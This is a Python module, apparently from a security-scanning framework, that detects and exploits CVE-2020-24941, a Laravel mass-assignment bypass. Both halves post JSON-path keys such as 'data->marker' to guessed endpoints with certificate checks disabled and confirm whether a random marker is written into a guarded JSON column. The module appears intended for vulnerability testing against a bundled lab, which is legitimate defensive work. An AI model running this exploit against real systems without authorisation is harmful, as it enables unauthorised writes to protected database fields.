#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2020-24941')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2020-24941 — Laravel Mass Assignment Guard Bypass (SAFE DETECTOR)

Summary:
    Laravel versions prior to 6.18.35 and 7.x before 7.24.0 may improperly handle
    the $guarded property, allowing mass assignment bypass via crafted JSON
    column nesting expressions. This module performs safe detection only.

Detection (aligned to what the exploit actually proves):
    ✔ Posts JSON-column-style keys into a model that relies on $guarded
    ✔ Flags ONLY when the unique marker is observably MASS-ASSIGNED into the
      JSON column by a guarded model (JSON echo / read-back, or SQL reflection)
    ✔ Treats an HTTP 422 (or any rejection) as the guard firing = SAFE = a MISS
    ✔ Unauthenticated; no credentials used
"""

import json
import uuid
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2020-24941",
        "name": "Laravel Mass Assignment $guarded Mishandling",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
    }

    sess.headers.update({"Accept": "application/json"})

    # CVE-2020-24941 is the pre-6.18.35 / pre-7.24.0 behavior where a model that
    # relies on $guarded accepts JSON path keys (for example data->marker) because
    # the key is not checked with the patched isGuardableColumn() logic. A 422 or
    # a missing marker means the app/framework blocked or dropped the payload.
    json_col = "data"
    marker = "ma_" + uuid.uuid4().hex[:8]
    endpoints = ["/", "/settings", "/api/settings"]

    # JSON-column-style keys that should be blocked on patched/hardened $guarded
    # models unless explicitly allow-listed with $fillable.
    bypass_payloads = [
        {f"{json_col}->{marker}": 1},
        {f"{json_col}->nested->{marker}": 1},
    ]

    result["detection_methods"].append("guarded_json_path_probe")
    last_obs = None

    for endpoint in endpoints:
        url = base + "/" if endpoint == "/" else base + endpoint

        for payload in bypass_payloads:
            try:
                r = sess.post(url, json=payload, timeout=6, verify=False)
            except Exception as e:
                last_obs = f"{endpoint} {list(payload)[0]}: {e}"
                continue

            # A 422 (or any non-2xx) = the app REJECTING the guarded payload = SAFE.
            # Do not treat it as vulnerable. Only inspect successful writes.
            body = r.text or ""
            low = body.lower()

            # Did the response confirm the JSON path marker was persisted?
            echoed = False
            try:
                j = r.json()
                if isinstance(j, dict):
                    for rec in _candidate_records(j):
                        if json_col in rec and _marker_written(rec.get(json_col), marker):
                            echoed = True
                            break
            except ValueError:
                pass

            if echoed:
                result["vulnerable"] = True
                result["status"] = "confirmed_vulnerable"
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "state_change"
                result["endpoint"] = url
                result["evidence"].append(
                    f"POST {endpoint} (HTTP {r.status_code}) with JSON-key payload "
                    f"persisted marker '{marker}' inside JSON column '{json_col}' on a $guarded model."
                )
                return result

            # SQL reflection naming the JSON column and marker is DB-side proof the
            # JSON-path value reached the write. Generic errors do NOT count.
            if ("insert into" in low or "sqlstate" in low) and json_col in low and marker in low:
                result["status"] = "sink_reachable"
                result["verdict"] = "sink_reachable"
                result["proof_type"] = "error_fingerprint"
                result["endpoint"] = url
                result["evidence"].append(
                    f"POST {endpoint} (HTTP {r.status_code}) — JSON marker '{marker}' "
                    f"reached SQL for column '{json_col}' (QueryException reflected)."
                )
                return result

            if r.status_code in (404, 405, 410):
                last_obs = f"{endpoint}: HTTP {r.status_code} (endpoint absent)"
                break

            last_obs = (
                f"{endpoint} {list(payload)[0]}: HTTP {r.status_code}, "
                f"no marker echo/read-back/SQL reflection in '{json_col}'"
            )

    # No observable JSON-path mass assignment -> MISS (a 422 rejection is the app
    # guarding correctly, not a vulnerability).
    result["evidence"].append(
        f"JSON column '{json_col}' was not observably mass-assigned via a guarded JSON path "
        f"(rejections/422 are the guard firing = safe). Last: {last_obs}"
    )
    return result


def _candidate_records(data):
    if not isinstance(data, dict):
        return
    yield data
    for key in ("setting", "record", "created", "attributes"):
        value = data.get(key)
        if isinstance(value, dict):
            yield value


def _marker_written(value, marker: str) -> bool:
    if isinstance(value, str):
        try:
            return _marker_written(json.loads(value), marker)
        except (TypeError, ValueError, json.JSONDecodeError):
            return False
    if isinstance(value, dict):
        if marker in value and _truthy(value.get(marker)):
            return True
        return any(_marker_written(v, marker) for v in value.values())
    if isinstance(value, list):
        return any(_marker_written(v, marker) for v in value)
    return False


def _truthy(value) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().lower() in {"1", "true", "yes", "on"}
    return value is not None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2020-24941 exploitation half — Laravel mass-assignment $guarded bypass.

Split from the original modules/cve_2020_24941.py (detection half: modules/cves/cve_2020_24941.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import json
import uuid
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt real exploitation of CVE-2020-24941 (Laravel $guarded mishandling).

    vuln_class = mass_assignment. Unauthenticated. NOT command-capable.

    The CVE: Laravel < 6.18.35 / 7.x < 7.24.0 lets JSON-column-style keys
    (e.g. `{"data->x":1}`) pass through mass assignment on models that rely on
    `$guarded`. The fix added guardable-column validation so JSON path keys are
    blocked unless explicitly allow-listed with `$fillable`.

    Honest exploitation here hinges on a unique marker being PERSISTED through a
    JSON path key on a $guarded model. Success is set ONLY when the server exposes
    an observable channel confirming that marker was written to the JSON column.

    The bundled lab exposes that observable channel by returning the created record. Success means
    our unique marker came back from inside the `data` JSON column after a JSON-key mass assignment
    attempt. A 422 or a generic echo without the marker is not counted.

    Never raises to the caller. username/password are ignored (route is unauthenticated).
    """
    options = options or {}

    out = {
        "cve": "CVE-2020-24941",
        "attempted": True,
        "success": False,
        "vuln_class": "mass_assignment",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        s = session or http_config.get_auth_session()
        s.headers.update({"Accept": "application/json"})

        json_col = options.get("json_column", "data")
        marker = options.get("marker", "ma_" + uuid.uuid4().hex[:8])
        endpoints = options.get("endpoints") or ["/", "/settings", "/api/settings"]

        # JSON-column-style keys that should be blocked on patched/hardened $guarded models
        # unless explicitly allow-listed with $fillable.
        bypass_payloads = [
            {f"{json_col}->{marker}": 1},
            {f"{json_col}->nested->{marker}": 1},
        ]

        last_obs = None

        for endpoint in endpoints:
            url = base + "/" if endpoint == "/" else base + endpoint

            for payload in bypass_payloads:
                try:
                    r = s.post(url, json=payload, timeout=12, verify=False)
                except Exception as e:  # noqa: BLE001
                    last_obs = f"{endpoint} {list(payload)[0]}: {e}"
                    continue

                body = r.text or ""
                low = body.lower()

                # Did the response confirm the GUARDED column was persisted with our value?
                echoed = False
                try:
                    j = r.json()
                    if isinstance(j, dict):
                        for rec in _candidate_records(j):
                            if json_col in rec and _marker_written(rec.get(json_col), marker):
                                echoed = True
                                break
                except ValueError:
                    pass

                if echoed:
                    out["success"] = True
                    out["evidence"] = (
                        f"POST {endpoint} (HTTP {r.status_code}) with JSON-key payload {payload} "
                        f"persisted marker '{marker}' inside JSON column '{json_col}' on a $guarded model. "
                        f"Response: {body[:400]}"
                    )
                    out["detail"] = (
                        f"CVE-2020-24941 confirmed: JSON path mass assignment into '{json_col}' "
                        f"was accepted by a $guarded model."
                    )
                    out["artifacts"] = {"endpoint": endpoint, "payload": payload, "json_column": json_col}
                    return out

                # SQL reflection that names the JSON column and marker is also DB-side proof.
                # Generic unknown-column errors do NOT count.
                if ("insert into" in low or "sqlstate" in low) and json_col in low and marker in low:
                    out["success"] = True
                    out["evidence"] = (
                        f"POST {endpoint} (HTTP {r.status_code}) — JSON marker '{marker}' "
                        f"reached SQL for column '{json_col}' (QueryException reflected). Response: {body[:500]}"
                    )
                    out["detail"] = (
                        f"CVE-2020-24941 confirmed: JSON path mass assignment into '{json_col}' "
                        f"reached Eloquent's write path."
                    )
                    out["artifacts"] = {"endpoint": endpoint, "payload": payload, "json_column": json_col}
                    return out

                if r.status_code in (404, 405, 410):
                    last_obs = f"{endpoint}: HTTP {r.status_code} (endpoint absent)"
                    break

                last_obs = (
                    f"{endpoint} {list(payload)[0]}: HTTP {r.status_code}, "
                    f"no marker echo/read-back/SQL reflection in '{json_col}'. body={body[:160]}"
                )

        # No observable confirmation that the JSON path marker was persisted.
        out["success"] = False
        out["requires"] = ["observable_persistence_channel"]
        out["reason"] = (
            f"Could not confirm JSON column '{json_col}' was persisted via the nested-key "
            f"bypass over pure HTTP. The target may be patched, using an explicit $fillable allow-list, "
            f"rejecting the payload, or lacking a read-back surface for '{json_col}'. Last: {last_obs}"
        )
        out["detail"] = "Guarded-model JSON-path mass assignment not confirmed against target."
        return out

    except Exception as e:  # noqa: BLE001 — never raise to the caller
        out["success"] = False
        out["reason"] = f"exploit error: {type(e).__name__}: {e}"
        out["detail"] = "Exploit attempt errored internally."
        return out


def _candidate_records(data):
    if not isinstance(data, dict):
        return
    yield data
    for key in ("setting", "record", "created", "attributes"):
        value = data.get(key)
        if isinstance(value, dict):
            yield value


def _marker_written(value, marker: str) -> bool:
    if isinstance(value, str):
        try:
            return _marker_written(json.loads(value), marker)
        except (TypeError, ValueError, json.JSONDecodeError):
            return False
    if isinstance(value, dict):
        if marker in value and _truthy(value.get(marker)):
            return True
        return any(_marker_written(v, marker) for v in value.values())
    if isinstance(value, list):
        return any(_marker_written(v, marker) for v in value)
    return False


def _truthy(value) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().lower() in {"1", "true", "yes", "on"}
    return value is not None
